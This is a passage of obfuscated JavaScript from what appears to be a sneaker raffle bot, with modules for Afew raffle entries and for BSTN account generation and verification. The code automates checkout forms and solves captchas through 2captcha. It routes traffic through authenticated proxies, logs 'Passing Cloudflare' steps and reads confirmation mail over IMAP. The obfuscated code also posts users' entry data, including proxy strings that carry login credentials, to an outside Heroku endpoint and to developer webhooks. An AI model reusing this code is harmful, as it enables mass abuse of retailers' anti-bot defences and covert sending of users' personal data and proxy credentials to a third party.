                        _0x4f0f0d = await _0x45f1d0['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x54fc6a[0x0] + ':' + _0x54fc6a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x2f878f = JSON['parse'](_0x1ed524['readFileSync']('sizes.json', 'utf-8')), _0x36798c = _0x54c3ea[_0x2088b6]['Url'], _0x2f6f42 = _0x54c3ea[_0x2088b6]['Size'], _0x1cba8b;
                        async function _0x2d5d0c() {
                            var _0x28bdb7 = new _0x4a24f3['CookieJar']();
                            console['log'](_0x1500d7() + '\x20[' + _0x3d3f22['name'] + ']\x20Task\x20' + (_0x2088b6 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x40fd2a;
                            let _0x541ec9 = {
                                'method': 'GET',
                                'cookieJar': _0x28bdb7,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x54fc6a[0x2] + ':' + _0x54fc6a[0x3] + '@' + _0x54fc6a[0x0] + ':' + _0x54fc6a[0x1]
                            }, _0x4735e9 = _0x36798c['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x45b1ca = _0x4735e9 + '.json', _0x151029 = await _0x4a5c70(_0x45b1ca);
                            console['log'](_0x1500d7() + '\x20[' + _0x3d3f22['name'] + ']\x20Task\x20' + (_0x2088b6 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0xc9d752 = _0x151029['data']['product']['variants'];
                            if (_0x2f6f42 != 'RANDOM') {
                                if (_0xc9d752[0x1]['option1']['includes']('W')) {
                                    const _0x1a9127 = _0x2f878f['women']['find'](_0x14d688 => _0x14d688['EUsize'] === _0x2f6f42);
                                    _0x1a9127 && (_0x2f6f42 = _0x1a9127['size']);
                                } else {
                                    if (_0xc9d752[0x1]['option1']['includes']('Y')) {
                                        const _0x1929e9 = _0x2f878f['GS']['find'](_0x82164c => _0x82164c['EUsize'] === _0x2f6f42);
                                        _0x1929e9 && (_0x2f6f42 = _0x1929e9['size']);
                                    } else {
                                        const _0x1060de = _0x2f878f['men']['find'](_0xc4fcfc => _0xc4fcfc['EUsize'] === _0x2f6f42);
                                        _0x1060de && (_0x2f6f42 = _0x1060de['size']);
                                    }
                                }
                                for (var _0xb039a1 of _0xc9d752) {
                                    _0xb039a1['option1'] == _0x2f6f42 && (_0x40fd2a = _0xb039a1['id']);
                                }
                            } else {
                                var _0x418407 = Math['round'](Math['random']() * (_0xc9d752['length'] - 0x1));
                                _0x40fd2a = _0xc9d752[_0x418407]['id'];
                            }
                            console['log'](_0x1500d7() + '\x20[' + _0x3d3f22['name'] + ']\x20Task\x20' + (_0x2088b6 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x4a5c70('https://raffles.afew-store.com/cart/' + _0x40fd2a + ':1'), _0x1cba8b = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x2d5d0c();
                        } catch (_0x526d07) {
                            if (_0x526d07['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x526d07);
                        }
                        const _0x422018 = await _0x4f0f0d['newPage']();
                        await _0x422018['setDefaultNavigationTimeout'](0x1d4c0), await _0x422018['authenticate']({
                            'username': '' + _0x54fc6a[0x2],
                            'password': '' + _0x54fc6a[0x3]
                        }), await _0x422018['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x422018['setRequestInterception'](!![]), _0x422018['on']('request', _0xc6505a => {
                            _0xc6505a['resourceType']() === 'image' || _0xc6505a['resourceType']() === 'font' || _0xc6505a['resourceType']() === 'media' ? _0xc6505a['abort']() : _0xc6505a['continue']();
                        });
                        try {
                            await _0x422018['goto'](_0x1cba8b, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x1500d7() + '\x20[' + _0x3d3f22['name'] + ']\x20Task\x20' + (_0x2088b6 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x422018['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x422018['type']('#checkout_email', '' + _0x54c3ea[_0x2088b6]['Email']), await _0x9175f4(0x320), await _0x422018['type']('#checkout_attributes_instagram', '' + _0x54c3ea[_0x2088b6]['Follower']), await _0x9175f4(0x320), await _0x422018['select']('#checkout_shipping_address_country', '' + _0x54c3ea[_0x2088b6]['Country']), await _0x422018['waitForTimeout'](0x258), await _0x422018['type']('#checkout_shipping_address_first_name', '' + _0x54c3ea[_0x2088b6]['FirstName']), await _0x422018['waitForTimeout'](0x320), await _0x422018['type']('#checkout_shipping_address_last_name', '' + _0x54c3ea[_0x2088b6]['LastName']), await _0x422018['waitForTimeout'](0x2bc), await _0x422018['type']('#checkout_shipping_address_address1', _0x54c3ea[_0x2088b6]['Address1'] + '\x20' + _0x54c3ea[_0x2088b6]['HouseNumber']), await _0x422018['waitForTimeout'](0x2bc), await _0x422018['type']('#checkout_shipping_address_address2', '' + _0x54c3ea[_0x2088b6]['Address2']), await _0x422018['waitForTimeout'](0x2bc), await _0x422018['type']('#checkout_shipping_address_zip', '' + _0x54c3ea[_0x2088b6]['Zip']), await _0x422018['waitForTimeout'](0x2bc), await _0x422018['type']('#checkout_shipping_address_city', '' + _0x54c3ea[_0x2088b6]['City']), await _0x422018['waitForTimeout'](0x2bc);
                        if (_0x54c3ea[_0x2088b6]['State'] != '')
                            try {
                                const _0x2e0e94 = JSON['parse'](_0x1ed524['readFileSync']('States.json', 'utf8'));
                                await _0x9175f4(0x1f4);
                                if (_0x54c3ea[_0x2088b6]['State']['length'] > 0x2)
                                    for (let _0x24dfe2 of _0x2e0e94) {
                                        if (_0x24dfe2['Province'] == _0x54c3ea[_0x2088b6]['State']) {
                                            await _0x422018['select']('#checkout_shipping_address_province', _0x24dfe2['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x422018['select']('#checkout_shipping_address_province', _0x54c3ea[_0x2088b6]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x9175f4(0x1f4), console['log'](_0x1500d7() + '\x20[' + _0x3d3f22['name'] + ']\x20Task\x20' + (_0x2088b6 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x9175f4(0x190), _0x422018['evaluate'](() => {
                            const _0x98dd52 = document['querySelector']('#continue_button');
                            for (var _0x494f18 = 0x0; _0x494f18 < 0x5; _0x494f18++) {
                                if (_0x98dd52) {
                                    _0x98dd52['click'](), _0x98dd52['click']();
                                    break;
                                } else
                                    _0x9175f4(0xfa0);
                            }
                        }), await _0x422018['waitForTimeout'](0x9c4);
                        try {
                            await _0x422018['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x422018['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x256120 => _0x256120['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x422018['waitForTimeout'](0x7d0), console['log'](_0x1500d7() + '\x20[' + _0x3d3f22['name'] + ']\x20Task\x20' + (_0x2088b6 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x422018['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x9175f4(0x3e8), await _0x422018['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x170348 => _0x170348['submit']()), await _0x9175f4(0x3e8);
                        try {
                            await _0x422018['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x422018['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x55d51f => _0x55d51f['submit']());
                        try {
                            await _0x422018['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x28c7e8 = 'no', _0x3e2f6d(_0x54c3ea[_0x2088b6], _0x3d3f22), console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x3d3f22['name'] + ']\x20Task\x20' + (_0x2088b6 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x263298['webhook'] != undefined && _0x263298['webhook'] != '')
                                try {
                                    await _0x1cac9f(_0x263298['webhook'], _0x3f8bfc['succesDEVMSG']);
                                } catch {
                                }
                            await _0x9175f4(0xc8), await _0x1cac9f(_0x48f5f5, _0x3f8bfc['succesDEVMSG']), await _0x9175f4(0xc8);
                            try {
                                await _0x1cac9f(_0x2f03c2, _0x3f8bfc['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x100f6f['replace']('#', ''),
                                    'module': _0x3d3f22['name'],
                                    'entrydata': JSON['stringify'](_0x192ee1),
                                    'proxy': '' + _0x5522a2[_0x2088b6]
                                };
                                var _0x128a6b = JSON['stringify'](prxdata);
                                let _0x45a750 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4a5c70['post']('https://jraffles.herokuapp.com/success', _0x128a6b, _0x45a750);
                            } catch (_0x4da48c) {
                            }
                        } catch (_0x3ce664) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x380b9d) {
                        _0x380b9d['message']['includes']('selector') && (_0x380b9d = 'Connection\x20Error');
                        console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x3d3f22['name'] + ']\x20Task\x20' + (_0x2088b6 + 0x1) + '\x20:\x20' + _0x380b9d)), _0x3659e4 = '' + _0x380b9d;
                        var _0x3e2091 = await _0x22ebf6(_0x54c3ea[_0x2088b6], _0x3d3f22, 'dev', !![], _0x3659e4);
                        _0x3f8bfc['errorDEV'] = { 'embeds': [_0x3e2091] }, _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x3f8bfc['errorDEV']), await _0x1cac9f(_0x569bf6, _0x3f8bfc['errorDEV']), _0x28c7e8 = 'yes';
                    } finally {
                        _0x4f0f0d && _0x4f0f0d['close']();
                        if (_0x28c7e8 == 'yes' && _0x564c52 != 0x5 && _0x3659e4 != 'Size\x20Not\x20Found') {
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x3d3f22['name'] + ']\x20Task\x20' + (_0x2088b6 + 0x1) + '\x20:\x20Retrying\x20(' + _0x564c52 + '\x20/\x205)')), _0x2088b6 = _0x2088b6 - 0x1, _0x564c52 = _0x564c52 + 0x1;
                            continue;
                        }
                        _0x28c7e8 == 'yes' && _0x564c52 >= 0x5 && (_0x194f3c(_0x54c3ea[_0x2088b6], _0x3d3f22), _0x28c7e8 = 'no', _0x564c52 = 0x0);
                        if (_0x2088b6 + 0x1 == _0x54c3ea['length']) {
                            await _0x9175f4(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x263298['AfewDelay'] + '\x20ms'), await _0x9175f4(_0x263298['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x504294, _0x2d9028, _0x14ca65) {
                    _0x45f1d0['use'](_0x49d897()), _0x45f1d0['use'](_0x5ae7c2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x263298['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x21250f = 0x0; _0x21250f < _0x2d9028['length']; _0x21250f++) {
                        if (_0x249ab1 != 'yes')
                            var _0x249ab1 = '', _0x494fdf = 0x0;
                        var _0x2a2f07;
                        try {
                            await _0x5c0aeb(_0x2d9028, _0x21250f);
                        } catch {
                            _0x249ab1 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x73a448(_0x504294['name'] + '\x20Task\x20' + (_0x21250f + 0x1) + '\x20/\x20' + _0x2d9028['length'] + '\x20||\x20File:\x20' + _0x45373f + '\x20Proxies:\x20' + _0x362291);
                        var _0x33dae6 = await _0x22ebf6(_0x2d9028[_0x21250f], _0x504294, 'acc', ![]);
                        const _0xcd06c5 = { 'succesDEVMSG': { 'embeds': [_0x33dae6] } }, _0x2fd9da = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x506c45 = Math['round'](Math['random']() * (_0x14ca65['length'] - 0x1)), _0x4a339a = _0x14ca65[_0x506c45]['split'](':'), _0x7fc9d8;
                        try {
                            _0x7fc9d8 = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4a339a[0x0] + ':' + _0x4a339a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x7fc9d8 = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4a339a[0x0] + ':' + _0x4a339a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x21294b = await _0x7fc9d8['newPage']();
                            await _0x21294b['authenticate']({
                                'username': '' + _0x4a339a[0x2],
                                'password': '' + _0x4a339a[0x3]
                            }), console['log'](_0x1500d7() + '\x20[' + _0x504294['name'] + ']\x20Task\x20' + (_0x21250f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x21294b['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x21294b['setRequestInterception'](!![]), _0x21294b['on']('request', _0x16e528 => {
                                _0x16e528['resourceType']() === 'image' ? _0x16e528['abort']() : _0x16e528['continue']();
                            });
                            try {
                                await _0x21294b['goto']('' + _0x2fd9da), await _0x21294b['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x249ab1 = 'yes';
                                throw new Error('Proxy\x20Error');
                            }
                            await _0x21294b['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x1500d7() + '\x20[' + _0x504294['name'] + ']\x20Task\x20' + (_0x21250f + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x9175f4(0x7d0), console['log'](_0x1500d7() + '\x20[' + _0x504294['name'] + ']\x20Task\x20' + (_0x21250f + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x9175f4(0x190), await _0x21294b['waitForSelector']('#firstname'), await _0x21294b['type']('#firstname', _0x2d9028[_0x21250f]['FirstName'], { 'delay': 0xf0 }), await _0x9175f4(0x190), await _0x21294b['type']('#lastname', _0x2d9028[_0x21250f]['LastName'], { 'delay': 0xe6 }), await _0x9175f4(0x190), await _0x21294b['type']('#email_address', _0x2d9028[_0x21250f]['Email'], { 'delay': 0x122 }), await _0x9175f4(0x190), await _0x21294b['type']('#password', _0x2d9028[_0x21250f]['Password'], { 'delay': 0x82 }), await _0x9175f4(0x1f4), await _0x21294b['type']('#password-confirmation', _0x2d9028[_0x21250f]['Password'], { 'delay': 0x7c }), console['log'](_0x1500d7() + '\x20[' + _0x504294['name'] + ']\x20Task\x20' + (_0x21250f + 0x1) + '\x20:\x20Sending\x20Request'), await _0x9175f4(0x2bc), await _0x21294b['$eval']('#form-validate', _0x25b70c => _0x25b70c['submit']()), await _0x9175f4(0x1388);
                            const _0x5f13d0 = await _0x21294b['$']('#email_address-error');
                            if (_0x5f13d0)
                                throw new Error('Invalid\x20Email');
                            const _0x32e82f = await _0x21294b['$']('#password-error');
                            if (_0x32e82f)
                                throw new Error('Invalid\x20Password');
                            await _0x21294b['waitForSelector']('div.mesg-success'), _0x249ab1 = 'no', console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x504294['name'] + ']\x20Task\x20' + (_0x21250f + 0x1) + '\x20:\x20Account\x20' + _0x2d9028[_0x21250f]['Email'] + '\x20Generated')), _0x1ed524['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x2d9028[_0x21250f]['Email'] + ',' + _0x2d9028[_0x21250f]['Password']);
                            try {
                                _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0xcd06c5['succesDEVMSG']);
                            } catch {
                            }
                            await _0x1cac9f(_0x515b29, _0xcd06c5['succesDEVMSG']);
                            let _0x341911 = _0x2d9028[_0x21250f];
                            try {
                                prxdata = {
                                    'username': _0x100f6f['replace']('#', ''),
                                    'module': _0x504294['name'],
                                    'entrydata': JSON['stringify'](_0x341911),
                                    'proxy': '' + _0x14ca65[_0x21250f]
                                };
                                var _0x4e8b81 = JSON['stringify'](prxdata);
                                let _0x455789 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4a5c70['post']('https://jraffles.herokuapp.com/success', _0x4e8b81, _0x455789);
                            } catch (_0x2ae391) {
                            }
                            console['log'](_0x561058['yellow'](_0x1500d7() + '\x20[' + _0x504294['name'] + ']\x20Task\x20' + (_0x21250f + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x408604) {
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x504294['name'] + ']\x20Task\x20' + (_0x21250f + 0x1) + '\x20:\x20' + _0x408604)), _0x2a2f07 = '' + _0x408604;
                            var _0x3af1a5 = await _0x22ebf6(_0x2d9028[_0x21250f], _0x504294, 'acc', !![], _0x2a2f07);
                            _0xcd06c5['errorDEV'] = { 'embeds': [_0x3af1a5] }, _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0xcd06c5['errorDEV']), await _0x1cac9f(_0x569bf6, _0xcd06c5['errorDEV']), _0x249ab1 = 'yes';
                        } finally {
                            if (_0x7fc9d8)
                                _0x7fc9d8['close']();
                            if (_0x249ab1 == 'yes' && _0x494fdf != 0x5) {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x504294['name'] + ']\x20Task\x20' + (_0x21250f + 0x1) + '\x20:\x20Retrying\x20(' + _0x494fdf + '\x20/\x205)')), _0x21250f = _0x21250f - 0x1, _0x494fdf = _0x494fdf + 0x1;
                                continue;
                            }
                            _0x249ab1 == 'yes' && _0x494fdf >= 0x5 && (_0x194f3c(_0x2d9028[_0x21250f], _0x504294), _0x249ab1 = 'no', _0x494fdf = 0x0), console['log'](_0x1500d7() + '\x20[' + _0x504294['name'] + ']\x20Waiting\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x5f1514, _0xd9b138) {
                    var _0xf0449b = ![], _0x782c13 = [];
                    async function _0x560b1f() {
                        var _0x19de1e = new _0x518654({
                            'user': _0x263298['masterMail'],
                            'password': _0x263298['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x20e44a(_0x3ecf05) {
                            _0x19de1e['openBox']('INBOX', ![], _0x3ecf05);
                        }
                        _0x19de1e['once']('ready', function () {
                            _0x20e44a(function (_0x1c12e1, _0x4f2ab8) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x1c12e1)
                                    throw _0x1c12e1;
                                _0x19de1e['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x222d99, _0x41c007) {
                                    if (!_0x41c007 || !_0x41c007['length'])
                                        console['log'](_0x1500d7() + '\x20[' + _0x5f1514['name'] + ']\x20No\x20mails\x20found'), _0x19de1e['end']();
                                    else {
                                        var _0x441181 = _0x19de1e['seq']['fetch'](_0x41c007, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x441181['on']('message', function (_0x4a83a0, _0x5125fd) {
                                            var _0x3b343f = '(#' + _0x5125fd + ')\x20';
                                            _0x4a83a0['on']('body', function (_0x150168, _0x1bc833) {
                                                _0x504fd9(_0x150168, (_0x3f6506, _0x21b0a1) => {
                                                    var _0x2208cc = _0x21b0a1['text']['split']('[')[0x2], _0x4224b3 = _0x2208cc['split'](']')[0x0];
                                                    _0x782c13['push'](_0x4224b3);
                                                });
                                            }), _0x4a83a0['once']('end', function () {
                                            });
                                        }), _0x441181['once']('error', function (_0x243f43) {
                                            console['log']('Fetch\x20error:\x20' + _0x243f43), _0xf0449b = !![];
                                        }), _0x441181['once']('end', function () {
                                            _0x19de1e['end'](), _0xf0449b = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x19de1e['once']('error', function (_0x4ef293) {
                            console['log'](_0x561058['red'](_0x4ef293['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0xf0449b = !![];
                        }), _0x19de1e['once']('end', async function () {
                            _0xf0449b = !![];
                        }), _0x19de1e['connect']();
                    }
                    async function _0x359210(_0x1fd42c, _0x34c9b7, _0x528aa6) {
                        _0x45f1d0['use'](_0x49d897());
                        for (var _0x1e073e = 0x0; _0x1e073e < _0x34c9b7['length']; _0x1e073e++) {
                            if (_0x166bee != 'yes')
                                var _0x166bee = '', _0x232f41 = 0x0;
                            var _0x4ae87b = Math['round'](Math['random']() * (_0x528aa6['length'] - 0x1)), _0x427831 = _0x528aa6[_0x4ae87b]['split'](':'), _0x548add;
                            try {
                                _0x548add = await _0x45f1d0['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x427831[0x0] + ':' + _0x427831[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x548add = await _0x45f1d0['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x427831[0x0] + ':' + _0x427831[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x2abcdf = await _0x548add['newPage']();
                                await _0x2abcdf['authenticate']({
                                    'username': '' + _0x427831[0x2],
                                    'password': '' + _0x427831[0x3]
                                }), console['log'](_0x1500d7() + '\x20[' + _0x1fd42c['name'] + ']\x20Task\x20' + (_0x1e073e + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x2abcdf['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2abcdf['setRequestInterception'](!![]), _0x2abcdf['on']('request', _0xfc65fc => {
                                    _0xfc65fc['resourceType']() === 'image' || _0xfc65fc['resourceType']() === 'font' || _0xfc65fc['resourceType']() === 'media' ? _0xfc65fc['abort']() : _0xfc65fc['continue']();
                                }), console['log'](_0x1500d7() + '\x20[' + _0x1fd42c['name'] + ']\x20Task\x20' + (_0x1e073e + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x2abcdf['goto'](_0x34c9b7[_0x1e073e]);
                                } catch {
                                    _0x166bee = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                console['log'](_0x1500d7() + '\x20[' + _0x1fd42c['name'] + ']\x20Task\x20' + (_0x1e073e + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x2abcdf['waitForTimeout'](0xbb8);
                                try {
                                    await _0x2abcdf['waitForSelector']('.account-nav'), _0x166bee = 'no', console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x1fd42c['name'] + ']\x20Task\x20' + (_0x1e073e + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x1040a9 = await _0x22ebf6(null, _0x1fd42c, 'ver', ![]);
                                    const _0x248948 = { 'succesDEVMSG': { 'embeds': [_0x1040a9] } };
                                    await _0x1cac9f(_0x13add5, _0x248948['succesDEVMSG']);
                                } catch {
                                    _0x166bee = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x57159e) {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x1fd42c['name'] + ']\x20Task\x20' + (_0x1e073e + 0x1) + '\x20:\x20' + _0x57159e));
                                var _0x18aa5c = _0x57159e, _0x2c9599 = await _0x22ebf6(null, _0x1fd42c, 'ver', !![], _0x18aa5c);
                                const _0x3a73ae = { 'errorDEVMSG': { 'embeds': [_0x2c9599] } };
                                _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x3a73ae['errorDEVMSG']), await _0x1cac9f(_0x569bf6, _0x3a73ae['errorDEVMSG']);
                            } finally {
                                _0x548add['close']();
                                if (_0x166bee == 'yes' && _0x232f41 != 0x5) {
                                    console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x1fd42c['name'] + ']\x20Task\x20' + (_0x1e073e + 0x1) + '\x20:\x20Retrying\x20(' + _0x232f41 + '\x20/\x205)')), _0x1e073e = _0x1e073e - 0x1, _0x232f41 = _0x232f41 + 0x1;
                                    continue;
                                }
                                _0x166bee == 'yes' && _0x232f41 >= 0x5 && (_0x166bee = 'no', _0x232f41 = 0x0), console['log'](_0x1500d7() + '\x20[' + _0x1fd42c['name'] + ']\x20Waiting\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                            }
                        }
                    }
                    try {
                        _0x560b1f();
                        while (!_0xf0449b) {
                            await _0x9175f4(0xfa0);
                        }
                        console['log']('Found\x20' + _0x782c13['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x9175f4(0x7d0);
                    }
                    await _0x359210(_0x5f1514, _0x782c13, _0xd9b138);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x132e92, _0x34c92c, _0x203bb0) {
                    _0x45f1d0['use'](_0x49d897()), _0x45f1d0['use'](_0x5ae7c2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x263298['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x40595a = 0x0; _0x40595a < _0x34c92c['length']; _0x40595a++) {
                        var _0x1234d9, _0xa66fd9 = _0x34c92c[_0x40595a];
                        try {
                            await _0x5c0aeb(_0x34c92c, _0x40595a);
                        } catch {
                            _0x3b1c3b = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x56356c(_0x20632f) {
                            const _0x277f5c = _0x1ed524['readFileSync']('../successful-tasks.csv', 'utf8'), _0x3b10f9 = _0x2057e4['parse'](_0x277f5c, { 'header': !![] })['data'];
                            let _0xfc733b = ![];
                            for (var _0x23aa52 of _0x3b10f9) {
                                if (_0x23aa52['Url'] == _0x20632f['Url'] && _0x23aa52['Email'] == _0x20632f['Email']) {
                                    _0xfc733b = !![];
                                    break;
                                }
                            }
                            return _0xfc733b;
                        }
                        if (await _0x56356c(_0x34c92c[_0x40595a]) == !![]) {
                            console['log'](_0x1500d7() + '\x20[' + _0x132e92['name'] + ']\x20Task\x20' + (_0x40595a + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                            continue;
                        }
                        if (_0x3b1c3b != 'yes')
